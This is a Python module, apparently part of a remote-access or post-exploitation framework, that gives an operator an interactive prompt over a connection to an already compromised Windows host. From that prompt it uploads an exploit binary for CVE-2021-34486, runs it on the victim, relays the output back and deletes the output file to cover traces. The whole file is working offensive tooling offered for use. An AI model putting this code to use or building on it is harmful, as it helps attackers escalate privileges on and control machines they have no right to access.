import struct
from AuxiliaryFunctions import uploadCVE
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI


def CVE_2021_34486(conn):
    commands = ["exit", "upload CVE_2021_34486.exe", "exploit"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;1;1mCVE-2021-34486 > \033[0m')
    while True:
        try:
            command1 = prompt(formatted_text1, completer=completer)
            if command1 == "":
                continue
            elif command1.split()[0] == 'upload':
                uploadCVE.uploadCVE(conn, command1)
                continue
            elif command1 == 'exit':
                break
            elif command1 == 'exploit':
                print('\033[1;31;31m' + "[!] Exploiting......" + '\033[0m')
                command3 = "CVE_2021_34486.exe exit > 1.txt && type 1.txt && DEL 1.txt && exit"
                conn.sendall(command3.encode("gbk"))
                result_len = conn.recv(4)
                real_len = struct.unpack("i", result_len)[0]
                while True:
                    if 1024 < real_len:
                        result = conn.recv(1024).decode("gbk", errors="ignore")
                        print(result)
                        real_len = real_len - 1024
                        continue
                    else:
                        result = conn.recv(1024).decode("gbk", errors="ignore")
                        print(result)
                        break
                print('\033[1;34;34m' + "[+] Done!" + '\033[0m')
                break
        except KeyboardInterrupt:
            print('\033[1;1;1m' + "[-] Exiting......" + '\033[0m')
            break
        except IndexError:
            print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
            continue
        except:
            print('\033[1;31;31m' + "[-] Something error!" + '\033[0m')
            break
